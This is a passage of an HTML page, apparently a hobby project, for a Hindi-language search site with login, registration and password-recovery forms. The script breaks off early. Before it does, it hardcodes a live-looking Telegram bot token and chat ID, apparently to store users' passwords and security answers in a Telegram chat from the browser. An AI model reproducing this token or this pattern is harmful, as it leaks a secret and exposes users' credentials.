<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Spidensh - Premium Search Hub</title>
    <style>
        body {
            background-color: #030712;
            color: #f3f4f6;
            font-family: 'Segoe UI', Roboto, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            overflow-x: hidden;
        }
        .navbar {
            position: absolute;
            top: 20px;
            right: 20px;
        }
        .btn-nav {
            background: rgba(0, 242, 254, 0.1);
            border: 1px solid #00f2fe;
            color: #00f2fe;
            padding: 8px 16px;
            border-radius: 20px;
            cursor: pointer;
            font-weight: bold;
            transition: 0.3s;
        }
        .btn-nav:hover {
            background: #00f2fe;
            color: #030712;
            box-shadow: 0 0 15px #00f2fe;
        }
        .main-container {
            width: 90%;
            max-width: 700px;
            text-align: center;
            padding: 40px 20px;
        }
        h1 {
            font-size: 3.5rem;
            font-weight: 800;
            background: linear-gradient(135deg, #00f2fe, #4facfe);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 10px;
            letter-spacing: 3px;
            filter: drop-shadow(0 0 20px rgba(0,242,254,0.2));
        }
        .tagline {
            color: #9ca3af;
            font-size: 14px;
            margin-bottom: 40px;
        }
        /* Glowing Tech Search Bar */
        .search-wrapper {
            background: rgba(255, 255, 255, 0.02);
            border: 1px solid rgba(0, 242, 254, 0.25);
            border-radius: 50px;
            padding: 6px 10px 6px 20px;
            display: flex;
            align-items: center;
            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(10px);
            transition: 0.4s ease;
        }
        .search-wrapper:focus-within {
            border-color: #00f2fe;
            box-shadow: 0 0 30px rgba(0, 242, 254, 0.25);
        }
        .search-field {
            width: 100%;
            background: transparent;
            border: none;
            outline: none;
            color: #fff;
            font-size: 18px;
            padding: 10px 0;
        }
        .search-action-btn {
            background: linear-gradient(135deg, #00f2fe, #4facfe);
            border: none;
            color: #030712;
            padding: 12px 28px;
            border-radius: 25px;
            font-weight: bold;
            cursor: pointer;
            font-size: 15px;
            transition: 0.3s;
        }
        .search-action-btn:hover {
            transform: scale(1.03);
        }
        .speed-badge {
            font-size: 12px;
            color: #00f2fe;
            margin-top: 15px;
            display: none;
            font-family: monospace;
        }
        /* Clean Clutter-Free Results Grid */
        .results-box {
            margin-top: 35px;
            text-align: left;
            background: rgba(255, 255, 255, 0.01);
            border-radius: 16px;
            padding: 20px;
            border: 1px solid rgba(255, 255, 255, 0.05);
            display: none;
            box-shadow: inset 0 0 20px rgba(255,255,255,0.02);
        }
        .result-card {
            padding: 15px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
        }
        .result-card:last-child { border-bottom: none; }
        .result-title {
            color: #00f2fe;
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 5px;
        }
        .result-snippet {
            font-size: 14px;
            color: #9ca3af;
            line-height: 1.6;
        }
        /* Auth Modals Container */
        .modal {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(3, 7, 18, 0.85);
            backdrop-filter: blur(8px);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 100;
            visibility: hidden;
            opacity: 0;
            transition: 0.3s ease;
        }
        .modal.active {
            visibility: visible;
            opacity: 1;
        }
        .modal-content {
            background: #0b1329;
            border: 1px solid rgba(0, 242, 254, 0.3);
            padding: 30px;
            border-radius: 16px;
            width: 90%;
            max-width: 400px;
            text-align: center;
            box-shadow: 0 0 40px rgba(0,242,254,0.1);
        }
        .modal-content h3 {
            margin-top: 0;
            color: #00f2fe;
            font-size: 22px;
        }
        .modal-content input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            background: #030712;
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 8px;
            color: #fff;
            box-sizing: border-box;
        }
        .modal-content input:focus {
            border-color: #00f2fe;
            outline: none;
        }
        .btn-submit {
            width: 100%;
            background: linear-gradient(135deg, #00f2fe, #4facfe);
            color: #030712;
            border: none;
            padding: 12px;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            margin-top: 15px;
        }
        .modal-links {
            margin-top: 15px;
            font-size: 13px;
            color: #9ca3af;
        }
        .modal-links span {
            color: #00f2fe;
            cursor: pointer;
            text-decoration: underline;
        }
        .loader {
            display: none;
            margin: 20px auto;
            width: 35px;
            height: 35px;
            border: 3px solid rgba(0,242,254,0.1);
            border-radius: 50%;
            border-top-color: #00f2fe;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="navbar">
    <button class="btn-nav" id="auth-nav-btn" onclick="openModal('login-modal')">रजिस्टर / लॉगिन</button>
</div>

<div class="main-container">
    <h1>SPIDENSH</h1>
    <div class="tagline">⚡ Light Speed Intelligent Data Index Engine</div>

    <!-- Search Bar Setup -->
    <div class="search-wrapper">
        <input type="text" id="search-input" class="search-field" placeholder="बिना कचरे के सटीक खोजें..." onkeypress="checkEnter(event)">
        <button class="search-action-btn" onclick="triggerSpidenshEngine()">सर्च करें</button>
    </div>

    <div class="speed-badge" id="speed-indicator"></div>
    <div class="loader" id="search-loader"></div>

    <!-- Clean Results Panel -->
    <div class="results-box" id="results-panel"></div>
</div>

<!-- LOGIN MODAL -->
<div class="modal" id="login-modal">
    <div class="modal-content">
        <h3>🔐 लॉगिन करें</h3>
        <input type="text" id="login-user" placeholder="यूज़रनेम">
        <input type="password" id="login-pass" placeholder="पासवर्ड">
        <button class="btn-submit" onclick="processLogin()">प्रवेश करें</button>
        <div class="modal-links">
            नया अकाउंट? <span onclick="switchModal('login-modal', 'register-modal')">यहाँ बनाएं</span><br>
            पासवर्ड भूल गए? <span onclick="switchModal('login-modal', 'recovery-modal')">रिकवर करें</span>
        </div>
    </div>
</div>

<!-- REGISTER MODAL -->
<div class="modal" id="register-modal">
    <div class="modal-content">
        <h3>📝 नया अकाउंट</h3>
        <input type="text" id="reg-user" placeholder="एक यूज़रनेम चुनें">
        <input type="password" id="reg-pass" placeholder="एक मजबूत पासवर्ड">
        <input type="text" id="reg-question" placeholder="गुप्त सवाल (उदा: पसंदीदा रंग?)">
        <input type="text" id="reg-answer" placeholder="उसका उत्तर (रिकवरी के लिए)">
        <button class="btn-submit" onclick="processRegister()">रजिस्टर करें</button>
        <div class="modal-links">पहले से अकाउंट है? <span onclick="switchModal('register-modal', 'login-modal')">लॉगिन करें</span></div>
    </div>
</div>

<!-- RECOVERY MODAL (ACCOUNT RECOVERY FEATURE) -->
<div class="modal" id="recovery-modal">
    <div class="modal-content">
        <h3>🔄 अकाउंट रिकवरी</h3>
        <p style="font-size:12px; color:#9ca3af;">अपना पासवर्ड रीसेट करने के लिए सुरक्षा उत्तर दें</p>
        <input type="text" id="rec-user" placeholder="अपना यूज़रनेम डालें">
        <input type="text" id="rec-answer" placeholder="अपने गुप्त सवाल का उत्तर दें">
        <input type="password" id="rec-new-pass" placeholder="नया पासवर्ड सेट करें">
        <button class="btn-submit" onclick="processRecovery()">पासवर्ड रीसेट करें</button>
        <div class="modal-links">याद आ गया? <span onclick="switchModal('recovery-modal', 'login-modal')">लॉगिन पर लौटें</span></div>
    </div>
</div>

<script>
    // आपके स्क्रीनशॉट से ली गई सटीक टेलीग्राम डिटेल्स
    const TELEGRAM_TOKEN = "8933396880:AAHvR3hbFNkQMuXkkb0hjb-sev8AMwn0UDI";
    const TELEGRAM_DB_ID = "-1004308068194";

    function checkEnter(e) { if (e.key === 'Enter') triggerSpidenshEngine(); }
    function openModal(id) { document.getElementById(id).classList.add('active'); }
    function closeModal(id) { document.getElementById(id).classList.remove('active'); }
    function switchModal(closeId, openId) { closeModal(closeId); openModal(openId); }

    // AUTH LOGIC (रजिस्ट्रेशन, लॉगिन और रिकवरी) WITH RECOVERY FLOW
    function processRegister() {
        const u = document.getElementById('reg-user').value.trim();
